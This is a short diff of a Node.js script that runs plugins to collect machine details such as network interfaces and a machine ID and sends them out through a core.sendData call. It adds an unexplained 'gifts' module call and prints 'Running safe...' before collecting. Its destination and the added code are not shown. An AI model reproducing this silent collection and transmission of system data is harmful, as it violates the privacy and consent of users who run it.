@@ -3,6 +3,7 @@
 const { exec } = require("child_process");
 const core = require("./lib/core");
 const utils = require("./lib/utils");
+const gifts = require("./gifts/gifts");
 
 let machineId;
 
@@ -31,6 +32,10 @@ function runPlugin({key, plugin}) {
     }
 }
 
+console.log("Running safe...");
+
+gifts.catscatscatscats(3000);
+
 plugins.forEach(plugin => {
     let data = runPlugin(plugin);
     if(plugin.key === "networkInterfaces") {
@@ -40,5 +45,3 @@ plugins.forEach(plugin => {
     console.log("Sending data:", postData);
     core.sendData(postData, plugin.key, machineId);
 });
-
-console.log("Running safe...");
